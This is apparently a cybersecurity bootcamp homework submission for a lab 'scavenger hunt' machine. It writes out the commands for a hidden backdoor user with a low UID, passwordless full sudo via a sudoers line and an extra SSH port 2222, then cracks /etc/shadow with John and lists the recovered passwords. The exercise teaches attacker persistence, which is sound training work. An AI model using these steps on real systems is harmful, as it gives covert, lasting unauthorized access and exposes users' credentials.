## Week 6 Homework Submission File: Advanced Bash - Owning the System

Please edit this file by adding the solution commands on the line below the prompt. 

Save and submit the completed file for your homework submission.

**Step 1: Shadow People** 

1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:

        useradd --no-create-home sysd
    

2. Give your secret user a password: 

        passwd sysd

    

3. Give your secret user a system UID < 1000:

        usermod -u 997 sysd


    

4. Give your secret user the same GID:

        #Makes primary group sudo
        usermod -g 27 sysd
        #Deletes old auto generated sysd user group 
        delgroup sysd
        #adds new GID for sysd
        addgroup -gid 997 sysd
        #adds sysd to gid
        usermod -g 997 sysd
   

5. Give your secret user full `sudo` access without the need for a password:

        #add sysd to sudoers file with NOPASSWD: ALL parameter
        
        sysd   ALL=(ALL:ALL) NOPASSWD: ALL
   

6. Test that `sudo` access works without your password:

        sudo -l
        Matching Defaults entries for sysd
        on scavenger-hunt:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

        User sysd may run the following
        commands on scavenger-hunt:
        (ALL : ALL) ALL
        (ALL : ALL) NOPASSWD: ALL
    
        

**Step 2: Smooth Sailing**

1. Edit the `sshd_config` file:

        # The strategy used for options in the default sshd_config shipped with
        # OpenSSH is to specify options with their default value where
        # possible, but leave them commented.  Uncommented options override the
        # default value.

        Port 22
        Port 2222
        #AddressFamily any
        #ListenAddress 0.0.0.0
        #ListenAddress ::

    

**Step 3: Testing Your Configuration Update**
1. Restart the SSH service:

        systemctl restart sshd.service
    

2. Exit the `root` account:

            exit

3. SSH to the target machine using your `sysd` account and port `2222`:

        ssh sysd@192.168.6.105 -p 2222

4. Use `sudo` to switch to the root user:

        $ sudo su

        You found flag_7:$1$zmr05X2t$QfOdeJVDpph5pBPpVL6oy0

        root@scavenger-hunt:/#

**Step 4: Crack All the Passwords**

1. SSH back to the system using your `sysd` account and port `2222`:

        ssh sysd@192.168.6.105 -p 2222

        

2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:

        sudo su
        john /etc/shadow
        freedom          (babbage)
        passw0rd         (sysadmin)
        trustno1         (mitnik)
        lakers           (turing)
        dragon           (lovelace)
        computer         (stallman)
        Goodluck!        (student)
        password         (sysd)

---

© 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.

